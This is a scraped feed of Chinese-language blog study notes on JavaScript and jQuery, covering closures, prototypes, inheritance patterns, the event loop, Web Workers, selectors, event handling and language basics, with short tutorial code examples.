1234567891011function fn1() &#123; var a = 2; function fn2() &#123;//产生了闭包 a++; console.log(a); &#125; return fn2&#125;var f = fn1();f() // 3f() // 4 闭包的作用 使用函数内部的变量在函数执行完厚,仍然存活在内存中(延长了局部变量的生命周期) 让函数外部可以操作(读写)到函数内部的数据(变量/函数) 闭包的生命周期 产生 在嵌套内部函数定义执行完时就产生了(不是在调用) 死亡 在嵌套的内部函数成为垃圾对象时 闭包的应用 定义JS模块 具有特定功能的js文件 将所有的数据和功能都封装在一个函数内部(私有的) 只向外暴露一个包含n个方法的对象或函数 模块的使用者,只需要通过模块暴露的对象调用方法来实现对应的功能 闭包的缺点以及如何解决 缺点 函数执行完厚,函数内的局部变量没有释放,占用内存时间会变长 容易造成内存泄漏 解决 能不用闭包就不用闭包 及时释放 变量 = null 内存溢出与内存泄露 内存溢出 一种程序运行出现的错误 当程序运行需要的内存超过了剩余的内存时, 就出抛出内存溢出的错误 内存泄露 占用的内存没有及时释放 内存泄露积累多了就容易导致内存溢出 常见的内存泄露: 意外的全局变量 没有及时清理的计时器或回调函数 闭包 总结 原型分为显式原型和隐式原型 每个函数都有一个prototype,也就是显式原型 每个实例对象都有一个__proto__，也就是隐式原型 实例对象的隐式原型的值等于构造函数的显式原型的值 原型链：通过隐式原型查找属性或方法的一条路径,Object的原型对象是原型链的尽头 原型链属性问题：读取对象属性或方法时才会查找原型链,设置时则不会 A instanceof B B函数的显式原型对象在A对象的原型链上，返回true，否则返回false 变量声明提升：通过var声明的变量, 在执行语句前,就会保存到window对象中，只是没有赋值 函数声明提升：通过function声明的函数,在声明语句前就可以调用 执行上下文：当前javascript代码被解析和执行时所在的环境的抽象概念 特点：动态生成 调用函数时就会自动生成一个执行上下文 结束时会自动销毁 作用域：一个代码所在区域 特点：静态，作用域在编写代码时就确定了 闭包：一个函数可以访问另一个函数作用域中的变量，前者是闭包 作用：让子函数能访问到父函数中的变量 面向对象高级(重点内容)对象的创建模式Object构造函数模式 创建流程 先创建空的Object对象,再动态添加属性/方法 适用场景 起始时不确定对象内部数据 存在问题 语句太多 实现代码 123456789// 创建空Object对象var obj = new Object();var obj = &#123;&#125;;// 动态添加属性/方法obj.name = 'Tom';obj.age = 14;obj.setName = function(name)&#123; this.name = name&#125; 对象字面量模式 创建流程 使用{}创建对象,同时指定属性/方法 适用场景 起始时对象内部属性是确定的 存在问题 如果创建多个对象,代码冗余 实现代码 12345678// &#123;&#125;创建对象, 同时指定属性/方法var obj = &#123; name: 'Tom', age: 14, setName: function(name)&#123; this.name = name; &#125;&#125; 工厂模式 创建流程 通过工厂函数动态创建对象并返回 适用场景 需要创建多个对象 存在问题 对象没有具体的类型,都是Object类型 实现代码 1234567891011// 创建工厂函数function createPerson(name, age)&#123; var obj = &#123; name: name, age: age, setName: function(name)&#123; this.name = name &#125; &#125; return obj&#125; 自定义构造函数模式 创建流程 自定义构造函数,通过new创建对象 适用场景 需要创建多个类型确定的对象 存在问题 每个对象都有相同的数据,浪费内存 实现代码 12345678910111213// 创建自定义构造函数function Person(name, age)&#123; this.name = name; this.age = age; this.setName = function(name)&#123; this.name = name &#125;&#125;// new创建对象var p1 = new Person('Tom', 12);p1.setName('YF');var p2 = new Person('Bom', 14);p2.setName('YangFan'); 构造函数+原型的组合模式 创建流程 自定义构造函数,属性在函数中初始化,方法添加到原型中 适用场景 需要创建多个类型确定的对象 实现代码 123456789101112131415// 自定义构造函数function Person(name, age)&#123; this.name = name; this.age = age;&#125;// 方法添加到原型中Person.prototype.setName = function(name)&#123; this.name = name;&#125;// new 创建对象var p1 = new Person('Tom', 14);p1.setName('YF');var p2 = new Person('Bom', 12);p2.setName('YangFan'); 继承模式原型链继承 实现流程 定义父类型构造函数 给父类型的原型添加方法 定义子类型的构造函数 创建父类型的对象赋值给子类型的原型 将子类型的原型的构造属性设置为子类型 给子类型原型添加方法 创建子类型的对象: 可以调用父类型的方法 实现继承的关键 子类型的原型为父类的一个实例对象 实现代码12345678910111213141516171819202122232425// 定义父类型构造函数function Supper()&#123; this.supPro = "Supper property";&#125;// 给父类型的原型添加方法Supper.prototype.showSupPro = function()&#123; console.log(this.supPro);&#125;// 定义子类型的构造函数function Sub()&#123; this.subPro = "Sub property";&#125;// 创建父类型的对象赋值给子类型的原型Sub.prototype = new Supper();// 将子类型的原型的构造属性设置为子类型Sub.prototype.constructor = Sub;// 给子类型原型添加方法Sub.prototype.showSubPro = function()&#123; console.log(this.subPro);&#125;// 创建子类型对象var s1 =new Sub();// 调用父类型方法s1.showSupPro(); 借用构造函数继承(不是真正意义上的继承) 实现流程 定义父类型构造函数 定义子类型构造函数 在子类型中构造函数中调用父类型构造 实现继承的关键 在子类型构造函数中通过call()调用父类型构造函数 实现代码1234567891011121314// 定义弗雷西构造函数function Person(name, age)&#123; this.name = name; this.age = age;&#125;// 定义子类型构造函数function Student(name, age, price)&#123; // 在子类型中构造函数中调用父类型构造 Person.call(this, name, age); this.price = price;&#125;var s1 = new Student('Tom', 14, 1000);console.log(s1.name, s1.age, s1.price); 原型链+借用构造函数的组合继承 实现关键 利用原型链实现对父类型对象的方法的继承 利用call()借用父类型构建函数初始化相同属性 实现代码 1234567891011121314151617181920212223function Person(name, age)&#123; this.name =name; this.age = age;&#125;Person.prototype.setName = function(name)&#123; this.name = name;&#125;function Student(name, age, price)&#123; Person.call(this, name, age); this.price = price;&#125;Student.prototype = new Person(); // 这一步是为了让子类型能使用到父类型的方法Student.prototype.constructor = Student; // 这一步是为了修正constructor属性Student.prototype.setPrice = function(price)&#123; this.price = price;&#125;var s1 =new Student('Tom', 14, 10000);s1.setName('Bom');s1.setPrice(8000);console.log(s1); 知识点 new一个对象背后做了什么? 创建一个空对象 给对象设置proto,值为构造函数的prototype属性值 this.proto = Fn.prototype 执行构造函数体(给对象添加属性/方法) 线程机制与事件机制线程与进程 进程 每个程序必须有一个进程,占有一片独立的内存空间 可以通过windows任务管理查看进程 线程 进程内的一个地理执行单元 执行程序的一个完整流程 CPU的最小调度单元 进程与线程的关系 一个进程至少有一个线程(主) 程序是在某个进程中的某个线程执行的 浏览器内核模块组成 主线程 JS引擎模块 负责js程序的编译与运行 HTML/CSS文档解析模块 负责页面文本的解析 DOM/CSS模块 负责dom/css在内存中的相关处理 布局和渲染模块 负责页面的布局和效果的绘制(内存中的对象) 分线程 定时器模块 负责定时器的管理 DOM事件模块 负责事件的管理 网络请求模块 负责Ajax请求 JS线程 JS是单线程执行的(回调函数也是在主线程) H5提出了实现多线程的方案: Web Workers 只能是主线程更新界面 定时器问题 定时器并不真正完全定时 如果在主线程执行了一个长时间的操作,可能导致延时才处理 事件处理机制 代码分类 初始化执行代码 包含绑定DOM事件监听、设置定时器、发送Ajax请求的代码 回调执行代码 处理回调逻辑 JS引擎执行代码的基本流程 初始化代码 ==&gt; 回调代码 模型的两个重要组成部分 事件管理模块 回调队列 模型的运转流程 执行初始化代码,将事件回调函数交给对应模块管理 当事件发生时,管理模块会将回调函数及其数据添加到回调列队中 只有当初始化代码执行完后(可能要一定时间),才会遍历读取回调队列中的回调函数执行 H5 Web Workers 可以让js在分线程执行 Worker实现代码 1234567var woker = new Worker('worker.js');// 用来接收另一个线程发送过来的数据的回调worker.onMessage = function(event)&#123; event.data;&#125;// 向另一个线程发送数据worker.postMessage(data1); 问题 worker内代码不能操作DOM更新UI 不是每个浏览器都支持这个新特性 不能跨域加载JS 总结 一个进程至少有一个线程(主) 浏览器内核模块组成 主线程中有JS引擎模块、HTML/CSS文档解析模块、DOM/CSS模块、布局和渲染模块 分线程中有定时器模块、DOM事件模块、网络请求模块 JS是单线程执行的 定时器并不真正完全定时 在事件处理机制中代码分为初始化执行代码和回调执行代码 Workers是H5中的分线程执行功能，但是存在一些问题]]></content>
      <categories>
        <category>Javascript</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>javascript学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery学习笔记]]></title>
    <url>%2F2020%2F08%2F31%2FjQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[jQuery基础jQuery入口函数使用jQuery的三个步骤 引入jQuery文件 入口函数 功能实现 jQuery的入口函数12345678910111213141516171819// 第一种写法$(document).ready(function()&#123; // code&#125;)// 第二种写法jQuery(document).ready(function()&#123; // code&#125;)// 第三种写法 开发中推荐使用$(function)&#123; // code&#125;// 第四种写法jQuery(function()&#123; // code&#125;) 两种解决jQuery冲突问题 释放$的使用权 1jQuery.noConflict() 注意点：释放操作必须在编写其他jQuery代码之前编写，释放之后就不能再使用$,改为使用jQuery 自定义一个访问符号 1234var jq = jQuery.noConflict()jq(function()&#123; // code&#125;) jQuery核心函数 $(); 调用jQuery的核心函数 参数 接收一个字符串 接收一个字符串选择器 返回一个jQuery对象，对象中报错了找到的DOM元素 接收一个字符串代码片段 返回一个jQuery对象，对象中保存了创建的DOM元素 接收一个DOM元素 会被包装成一个jQuery对象返回给我们 什么是jQuery对象 jQuery对象是一个伪数组 伪数组有0到length-1的属性，并且有length属性 静态方法和实例方法 怎么给类添加一个静态方法？ 直接添加给类就是静态方法 123456789// 定义一个类function Person()&#123;&#125;// 添加静态方法Person.showName = function()&#123; alert("showName");&#125; 怎样调用静态方法？ 静态方法通过类名调用 1Person.showName(); 怎么给类添加实例方法？ 添加到类的原型当中 123Person.prototype.showAge = function()&#123; alert('showAge');&#125; 怎样调用实例方法？ 实例方法通过类的实例调用 12var p = new Person();p.showAge(); jQueryAPI遍历 原生遍历数组的方法 forEach() 第一个参数：遍历到的元素 第二个参数：当前遍历到的索引 注意点 原生forEach方法只能遍历数组，不能遍历伪数组123456// 定义数组var arr = [1, 3, 5, 7, 9];// 遍历数组arr.forEach(function(value, index)&#123; console.log(index, value); &#125;) map()方法 第一个参数：当前遍历到的元素 第二个参数：当前遍历到的索引 第三个参数：当前遍历的数组 注意点 和原生的forEach一样,不能遍历的伪数组 1234var arr = [1, 3, 5, 7, 9];arr.map(function(value, index, array)&#123; console.log(index, value, array);&#125;) jQuery遍历数组的方法 each() 第一个参数：当前遍历到的索引 第二个参数：遍历到的元素 注意点 jQuery的each方法是可以遍历伪数组的12345678910// 真数组var arr = [1, 3, 5, 7, 9];var obj = &#123;0:1, 1:3, 2:5, 3:7, 4:9, length:5&#125;;// 伪数组$.each(arr, function(index, value)&#123; console.log(index, value);$.each(obj, function(index, value)&#123; console.log(index, value);&#125;); map() 第一个参数：要遍历的数组 第二个参数：要遍历一个原生之后执行的回调函数 回调函数的参数： 第一个参数：要遍历到的元素 第二个参数：遍历到的索引 注意点 jQuery种each静态方法一样，map静态方法也可以遍历1234var arr = [1, 3, 5, 7, 9];var obj = &#123;0:1, 1:3, 2:5, 3:7, 4:9, length:5&#125;;$.map(arr, function(value, index)&#123; console.log(index, value); 区别 jQuery中的each静态方法和map静态方法的区别：each静态方法默认的返回值就是，遍历谁就返回谁map静态方法则是默认返回值是一个空数组 each静态方法不支持再回调函数中对遍历的数组进行处理map静态方法可以再回调函数中通过return对遍历的数组进行处理，然后生成一个新数组返回 其他方法 $.trim() 作用：去除字符串两端空格 参数：需要去除空格的字符串 返回值：去除空格之后的字符串 $.isWindow() 作用：判断传入的对象是否是window对象 返回值：true/false $.isArray(); 作用：判断传入的对象是否是真数组 返回值：true/false $.isFunction(); 作用：判断传入的对象是否是一个函数 返回值：true/false 注意点： jQuery框架本质上是一个函数 12(function( window, undefined ) &#123; &#125;)( window ); 选择器 jQuery内容选择器 12345&lt;div&gt;&lt;/div&gt;&lt;div&gt;我是div&lt;/div&gt;&lt;div&gt;我是div123我是div123&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt; :empty 作用：找到既没有文本内容也没有子元素的指定元素 1var $div = $('div:empty'); :parent 作用：找到文本内容或有子元素的指定元素 1var $div = $('div:parent'); :contains(text) 作用：找到包含指定文本内容的指定元素 1var $div = $('div:contains(div)'); :has(selector) 作用：找到包含指定子元素的指定元素 1var $div = $('div:has("span")'); 属性和属性节点 原生操作属性节点的方法 setAttribute() 作用：设置属性节点 DOM元素.setAttribute(&#39;属性名称&#39;, &#39;值&#39;); getAttribute() 作用：获取属性节点 DOM元素.getAttribute(&#39;属性名称&#39;); jQuery操作属性节点的方法 attr(name|pro|key, val|fn) 作用：获取或者设置属性节点的值 第二个参数可选 传递一个参数，代表获取属性节点值 传递两个参数，代表设置属性节点值 var res = $(&quot;.sp1&quot;).attr(&#39;name&#39;, &#39;span&#39;); removeAttr(name) 作用：删除属性节点 注意点 会删除所有找到元素指定的属性节点 $(&#39;.sp2&#39;).removeAttr(&#39;name class&#39;); prop() 作用和attr方法一致 12console.log($('input').attr('checked')); //选中返回 checked 未选中返回undefined removeProp() 作用和removeAttr一致 12console.log($('input').prop('checked')); // 选中返回 true 未选中返回false 注意点 prop方法不仅能够操作属性，还能操作属性节点 attr和prop既然作用一致，那开发中究竟用谁? 官方推荐在操作属性节点时,具有 true 和 false 两个属性的属性节点，如 checked, selected 或者 disabled 使用prop()，其他的使用 attr()操作类 jQuery操作类方法 addClass(class|fn) 作用：添加一个类；如果要添加多个，多个类名之间用空格隔开即可 $(&#39;div&#39;).addClass(&#39;class1 class2&#39;); removeClass([class]|fn[, sw]) 作用：删除一个类；如果想删除多个，多个类名之间用空格隔开即可 $(&#39;div&#39;).removeClass(&#39;class1 class2&#39;); toggleClass(class|fn[, sw]) 作用：切换类；有就删除，没有就添加 `$(&apos;div&apos;).toggleClass(&apos;class1 class2&apos;);`操作文本值 jQuery操作文本值 html 和原生JS中的innerHTML一样 $(&#39;div&#39;).html(&#39;&lt;p&gt;我是p标签&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;&#39;); text 和原生JS中的innerText一样 $(&#39;div&#39;).text(&#39;&lt;p&gt;我是p标签&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;&#39;) val 设置或获取输入框值 $(&#39;input&#39;).val(&#39;请输入内容&#39;); 操作CSS样式 jQuery设置css样式 css(name|pro|[, val|fn]) 123456789101112131415161718// 1. 逐个设置$('div').css('width', '100px');$('div').css('height', '100px');$('div').css('background', 'red');// 2. 链式设置// 注意点：链式操作如果大于3步，建议分开$('div').css('width', '100px').css('height', '100px').css('background', 'green');// 3. 批量设置$('div').css(&#123; width: '100px', height: '100px', background: 'blue'&#125;)// 4. 获取CSS样式值console.log($('div').css('background')); 操作位置和尺寸12345&lt;div class="father"&gt; &lt;div class="son"&gt;&lt;/div&gt; &lt;/div&gt; &lt;button&gt;获取&lt;/button&gt; &lt;button&gt;设置&lt;/button&gt; jQuery操作位置和尺寸的方法 width([val|fn]) 作用：获取元素宽度 console.log($(&#39;.father&#39;).width()); height([val|fn]) 作用：获取元素高度 console.log($(&#39;.father&#39;).height()); offset([coordinates]) 作用：获取元素距离窗口的偏移位 console.log($(&#39;.son&#39;).offset().left); position() 作用：获取元素距离定位 console.log($(&#39;.son&#39;).position().left); scrollTop([val]) 作用：获取和设置滚动偏移位 获取 console.log($(&#39;.scroll&#39;).scrollTop()); 设置 $(&#39;.scroll&#39;).scrollTop(300); scrollLeft([val]) 作用同上；设置方向不同 事件事件的绑定绑定事件的两个步骤 获取对象 绑定事件 两种绑定事件方式 Element.eventName(fn) 编码效率略高/部分事件jQuery没有事件，所以不能添加 123$('button').clcik(function()&#123; alert('hello event');&#125;); on(eventName, fn) 编码效率略低/所以js事件都可以添加 123$('button').on('click', function()&#123; alert('hello event');&#125;); 注意点 可以添加多个相同或者不同类型的事件，不会覆盖事件的移出 off([eventName]) 不传递参数，会移出所有的事件 $(&quot;button&quot;).off(); 传递一个参数，会移除所有指定类型的事件 $(&quot;button&quot;).off(&quot;click&quot;); 传递两个参数，会移除所有指定类型的指定事件 $(&quot;button&quot;).off(&quot;click&quot;, callBack); 事件冒泡和默行为 什么是事件冒泡? 是一种机制；父元素father和子元素son都绑定了click事件，子元素触发click事件后，也会触发father的click事件。 阻止事件冒泡 第一种方式 return false 第二种方式 event.stopPropagation() 什么是默认行为? 也是一种机制;a标签触发单击事件后默认会打开另一个窗口,这就是默认行为 阻止默认行为 第一种方式 return false 第二种方式 event.preventDefault() 事件自动触发 trigger() 如果利用trigger自动触发事件，会触发事件冒泡和默认行为 $(&quot;.father&quot;).trigger(&quot;click&quot;); triggerHandler() 如果利用triggerHandler自动触发事件，不会触发事件冒泡和默认行为 $(&quot;.son&quot;).triggerHandler(&quot;click&quot;); 自定义事件想要自定义事件，必须满足两个条件 事件必须是通过on绑定的 事件必须通过trigger和triggerHandler来触发 1234$(".son").on("myClick", function () &#123; alert("son"); &#125;); $(".son").triggerHandler("myClick"); 事件命名空间想要事件的命名空间有效，必须满足两个条件 事件是通过on来绑定的 通过trigger和triggerHandler触发事件 12345678$(".son").on("click.zs", function () &#123; alert("click1");&#125;);$(".son").on("click.ls", function () &#123; alert("click2");&#125;);// $(".son").trigger("click.zs");$(".son").triggerHandler("click.zs"); 注意点 利用trigger触发子元素带命名空间的事件, 那么父元素带相同命名空间的事件也会被触发. 而父元素没有命名空间的事件不会被触发 利用trigger触发子元素不带命名空间的事件,那么子元素所有相同类型的事件和父元素所有相同类型的事件都会被触发事件的委托 什么是事件委托? 请别人帮忙做事情，然后将做完的结果反馈给我们 delegate() 1234567$("button").click(function () &#123; $("ul").append("&lt;li&gt;我是新增的li&lt;/li&gt;"); &#125;);$("ul").delegate("li", "click", function () &#123; console.log($(this).html()); &#125;); 鼠标移入移出 mouseover/mouseout 子元素被移入移出也会触发父元素的事件 1234567$(".father").mouseover(function () &#123; console.log("father被移入了");&#125;);$(".father").mouseout(function () &#123; console.log("father被移出了");&#125;); mouseenter/mouseleave 子元素被移入移出不会触发父元素的事件 12345678$(".father").mouseenter(function () &#123; console.log("father被移入了");&#125;);$(".father").mouseleave(function () &#123; console.log("father被移出了");&#125;); hover 移入移出都会触发事件 12345$(".father").hover(function () &#123; console.log("father被移入了");&#125;,function () &#123; console.log("father被移出了");&#125;); jQuery原理Ajax]]></content>
      <categories>
        <category>Javascript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript基础笔记]]></title>
    <url>%2F2020%2F08%2F31%2FJavascript%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[javascript 高级、解释型语言 支持面向对象、命令式、函数式编程 开发商：Netscape(网景) 最初发行时间：1995 基础介绍 js输出语句 控制浏览器弹出一个警告框 alert(“内容”) 让计算机在页面中输出一个内容 document.write(&quot;内容&quot;)) 向body中输出一个内容 向控制台输出一个内容 console.log(&quot;内容&quot;) js外部引入方式 &lt;script type=&quot;text/javascript&quot; src=&quot;js/script.js&quot;&gt;&lt;/script&gt; 注意事项 script标签一旦用于引入外部文件，就不能在标签内编写代码 如果需要在标签内编写则需要重新创建一个script来编写 Unicode编码使用 在js中使用Unicode编码 \u四位编码 - console.log(&quot;\u2620&quot;) 在html页面中使用Unicode编码 &amp;#编码; 这里得编码需要得是十进制 - &lt;h1&gt;&amp;#9760;&lt;/h1&gt;基本语法 js注释 单行注释 // 多行注释 /* */ js注意事项 1. js中严格区分大小写 2. js中每一条语句以分号(;)结尾 - 如果不写分号，浏览器会自动添加，但会影响性能 3. js中会忽略多个空格和换行 声明变量 var a = 100; 标识符 - js中所有可以自主命名的都是标识符 - 例如：变量名、函数名、属性名 - 命名一个标识符需要遵守的规则 1. 标识符中可以含有字母、数字、_、$ 2. 标识符不能以数字开头 3. 标识符不能是ES中的关键字或保留字 4. 标识符一般都采用驼峰命名法 - 首字母小写，每个单词的开头字母大写，其余字母小写 - js底层保存标识符实际上是采用Unicode编码 - 所以理论上讲，所有的utf-8中含有的内容都可以作为标识符 数据类型(6种) typeof 检查变量的类型 语法: typeof 变量 String 字符串 - &apos;&apos; - &quot;&quot; 转义字符(\) \ 转义字符 \n 表示换行 \t 制表符 \\ 表示\ Number 数值 - 包括整数和浮点数(小数) js中表示数字的最大值 Number.MAX_VALUE js中表示数字的最小值 Number.MIN_VALUE Number表示的数字超过了最大值显示： Infinity 表示正无穷 -Infinity 表示负无穷 用typeof 检查 类型为 Number 注意事项： 1. NaN 是一个特殊的数字 2. 如果使用js进行浮点运算，可能得到一个不精确的结果 Boolean 布尔值 - true - false Null 空值 - 表示一个为空的对象 - 使用typeof 检查 会返回 object Undefined 未定义 - 当声明一个变量，但未赋值，值就为undefined Object 对象 - Object属于引用数据类型 强制类型转换 - 指将一个数据类型强制转换为其他的数据类型 - 类型转换主要指，将其他的数据类型，转换为 String NumBer Boolean 将其他数据类型转换为String 方式一： - 调用被转换数据类型的toString()方法 - 该方法不会影响到原变量，它会将转换的结果返回 - 注意：null和undefined这两个值没有toString()方法 如果条用他们的方法，会报错 方式二： - 调用String()函数，并将被转换的数据作为参数传递给函数 - 使用String()函数做强制类型转换时， 对于Number和Boolean实际上就是调用toString()方法 但是对于null和undefined,就不会调用toString()方法 它会将null 直接转换为 &quot;null&quot; 将undefined 直接转换为 &quot;undefined&quot; 将其他的数据类型转换为Number 方式一： 使用Number() 函数 - 字符串转数字 1. 如果是纯数字的字符串，则直接将其转换为数字 2. 如果字符串中有非数字的内容，则转换为NaN 3. 如果字符串是一个空串或者是一个全是空格的字符串，则转换为0 - 布尔转数字 true 转成 1 false 转成 0 - null 转 数字 0 - undefined 转 数字 NaN 方式二： - 这种方式专门用来针对字符串 - parseInt() 把一个字符串转换为一个整数 - parseFloat() 把一个字符串转换成一个浮点数 将其他数据类型转换为Boolean - 使用Boolean()函数 - 数字 转 布尔 除了0 和 NaN，其余的都是true - 字符串 转 布尔 除了空串，其余的都是true - null 和 undefined 都会转换为false - 对象也会转换为true 运算符 算术运算符 当对非Number类型的值进行运算时，会将这些值转换为Number然后再运算 任何值和NaN做运算都得NaN + - * / % 一元运算符 + - 自增自减运算符 ++ -- 逻辑运算符 ! &amp;&amp; || &amp;&amp; || 非布尔值的情况 - 对于非布尔值进行与或运算时， 会先将其转换为布尔值，然后再运算，并且返回原值 - 与运算： - 如果第一个值为true，则必然返回第二个值 - 如果第一个值为false，则直接返回第一个值 - 或运算 - 如果第一个值为true，则直接返回第一个值 - 如果第一个值为false，则返回第二个值 赋值运算符 = += -= *= /= %= 关系运算符 &gt; &gt;= &lt; &lt;= - 字符串比较 是比较字符的Unicode编码 相等运算符 ==(相等 会自动做类型转换) !=(不相等) ===(全等 不会自动做类型转换) !==(不全等) - undefined 衍生自 null 条件运算符/三元运算符 语法： 条件表达式?语句1:语句2; 执行的流程： 条件运算符再执行时，首先对条件表达式进行求值， 如果该值为true,则执行语句1，并返回结果 如果该值为false，则执行语句2，并返回结果 运算符的优先级 流程控制 语句的分类： 1. 条件判断语句 2. 条件分支语句 3. 循环语句 条件判断语句： 语法一： if(条件表达式){ 语句; } 语法二： if(条件表达式){ 语句..; }else{ 语句..; } 语法三： if(条件表达式){ 语句..; }else if(条件表达式){ 语句..; }else if(条件表达式){ 语句..; }else{ 语句..; } 条件分支语句： 语法： switch(条件表达式){ case 表达式: 语句..; case 表达式: 语句..; case 表达式: 语句..; default: 语句..; break; } 循环语句 while循环： 语法： while(条件表达式){ 语句..; } do...while循环： 语法： do{ 语句..; }while(条件表达式); for循环 语法: for(初始化表达式;条件表达式;更新表达式){ 语句..; }(重点内容)对象 对象属于一种复合的数据类型，在对象中可以保存多个不同数据类型的属性 对象的分类： 1. 内建对象 - 由ES标准中定义的对象，在任何的ES的实现中都可以使用 - 比如：Math String Number Boolean Function Object ... 2. 宿主对象 - 由js的运行环境提供的对象，目前来讲主要指由浏览器提供的对象 - 比如 BOM DOM 3. 自定义对象 - 由开发人员自己创建的对象 对象的基本操作 创建对象 使用new关键字调用的函数，是构造函数constructor 构造函数是专门用来创建对象的函数 语法： var 变量名 = new Object(); 添加对象属性 语法： 对象.属性名 = 属性值; 读取对象中的属性 语法： 对象.属性名; 修改对象的属性值 语法： 对象.属性名 = 新值; 删除对象的属性 语法： delete 对象.属性名; 属性名 和 属性值 属性名 如果要使用特殊的属性名，不能采用.的方式来操作 需要使用另一种方式： 语法： 对象[&apos;属性名&apos;] = 属性值 特点： 使用[]这种形式去操作属性，更加灵活 属性值 js对象的属性值，可以是任意的数据类型 - 甚至可以是对象 in 运算符 - 通过该运算符可以检查一个对象中是否含有指定的属性 如果有则返回true，没有则返回false - 语法： &quot;属性名&quot; in 对象 基本数据类型与引用数据类型 基本数据类型 String Number Boolean Null Undefined 引用数据类型 Object 基本数据类型与引用数据类型区别 js中的变量(基本数据类型)都是保存到栈内存中的 基本数据类型的值直接在栈内存中存储 值与值之间是独立存在，修改一个变量不会影响到其他的变量 对象则是保存到堆内存中 每创建一个新的对象，就会在堆内存中开辟出一个新的空间， 而变量保存的是对象的内存地址（对象的引用）,如果两个变量 保存的是同一个对象引用，当通过一个变量修改属性时，另一个也会受到影响 当比较两个基本类型的时候，就是比较值。 而比较两个引用数据类型时，他们比较的对象是内存地址， 如果两个对象是一模一样，但是地址不同，它也会返回false 对象字面量 使用对象字面量，可以在创建对象时，直接指定对象中的属性 语法： {属性名:属性值,属性名:属性值...} 对象字面量的属性名可以加引号也可以不加,建议不加 如果要使用一些特殊的名字，则必须加引号 函数 函数也是一个对象 函数的实参可以是任意类型的数据 函数返回值可以是任意的数据类型 创建函数 使用 函数声明 来创建一个函数 语法： function 函数名([形参1,形参2...形参N]){ 语句...; } 使用 函数表达式 来创建一个函数 也叫匿名函数 语法： var 函数名 = function([形参1,形参2...形参N]){ 语句...; } 调用函数 语法： 函数名(); 函数的方法 call()和apply() - 这两个方法都是函数对象的方法，需要通过函数对象来调用 - 当对函数调用call() 和 apply() 都会调用函数执行 - 在调用call() 和 apply() 可以将一个对象指定为第一个参数 此时这个对象将会成为函数执行时的this - call() 方法可以将实参对象之后依次传递 - apply() 方法需要将实参在对象之后依次传递 - this的情况： 1. 以函数形式调用时，this永远都是window 2. 以方法的形式调用时，this是调用方法的对象 3. 以构造函数的形式调用时，this是新创建的那个对象 4. 使用call和apply调用时，this是指定的那个对象 函数的参数(arguments) 在调用函数时，浏览器每次都会传递进两个隐含的参数： 1. 函数的上下文对象 this 2. 封装实参的对象 arguments - arguments 是一个类数组对象，它也可以通过索引来操作数据，也可以获取长度 - 在调用函数时，我们所传递的实参都会在arguments中保存 - arguments.length 可以用来获取实参的长度 - 即使不定义形参，也可以通过arguments来使用实参，只不过比较麻烦 arguments[0] 表示第一个实参 arguments[1] 表示第二个实参 ... - 属性 callee 作用：指向当前正在指向的函数的对象 立即执行函数 函数定义完，立即被调用，这种函数叫做立即执行函数 立即函数往往只会执行一次 语法： (function(a,b){ alert(a+b); })(100,100); 函数也可以成为对象的属性 如果一个函数作为一个对象的属性保存， 那么我们称这个函数为对象的方法 调用这个函数就为调用对象的方法(method) 但是它只是名称上区别并没有其他区别 枚举对象中的属性 使用for ... in 语句 语法： for(var 变量 in 对象){ } 变量的声明提前 - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值） 但是如果声明变量时不适用var关键字，则变量不会被声明提前 函数的声明提前 - 使用函数声明形式创建的函数 function 函数(){} 它会在所有代码执行之前就创建，所以我们可以在声明前调用 作用域 - 作用域指一个变量的作用的范围 - 在js中一共有两种作用域： 1. 全局作用域 - 直接编写在script标签中的js代码，都在全局作用域 - 全局作用域在页面打开时创建，在页面关闭时销毁 - 在全局作用域中有一个全局对象window， 它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用 - 在全局作用域中： 创建的变量都会作为window对象的属性保存 创建的函数都会作为window对象的方法保存 - 全局作用域中的变量都是全局变量 在页面的任意的部分都可以访问到 2. 函数作用域 - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁 - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的 - 在函数作用域中可以访问到全局作用域的变量 在全局作用域中无法访问到函数作用域的变量 - 当在函数作用域操作一个变量时，它会现在自身作用域中寻找，如果有就直接使用 如果没有则向上一级作用域中寻找，直到找到全局作用域， 如果全局作用域中依然没有找到，则会报错ReferenceError - 在函数中要访问全局变量可以使用window对象 解析器在调用函数每次都会向函数内部传递进一个隐含的参数， 这个隐含的参数就是this，this指向的是一个对象， 这个对象我们称为函数执行的 上下文对象， 根据函数的调用方式的不同，this会指向不同的对象 1. 以函数的形式调用时，this永远都是window 2. 以方法的形式调用时，this就是调用方法的那个对象 构造函数 构造函数其实就是普通函数，创建方式和普通方式没有区别， 不同的是构造函数习惯首字母大写 构造函数和普通函数的区别： 调用方式的不同 普通函数就是直接调用，而构造函数需要使用new关键字来调用 构造函数的执行流程 1. 立即创建一个新对象 2. 将新建的对象设置为函数中this，在构造函数中可以使用this来引用新建的对象 3. 逐行执行函数中的代码 4. 将新建的对象作为返回值返回 使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类。 我们将通过一个构造函数创建的对象，称为该类的实例 this的情况 1. 当以函数的形式调用时，this是windo 2. 当以方法的形式调用时，谁调用方法this就是谁 3. 当以构造函数的形式调用时，this就是新创建的那个对象 运算符 instanceof 作用：检查 一个对象 是否 是一个类的实例 语法： 对象 instamceof 对象 原型 prototype 原型是个对象，可以用来弥补 多次调用构造函数的方法 会产生多个不同内存但是相同的方法。 通过把共有的对象写入 到原型对象中，可以有效解决这个缺陷。 原型对象如何使用？ 语法： 对象名.prototype.属性名= 属性值; 对象名.prototype.方法名 = function(){ }; 我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype 这个属性对应着一个对象，这个对象就是我们所谓的原型对象 如果 函数作为普通函数调用prototype没有任何作用 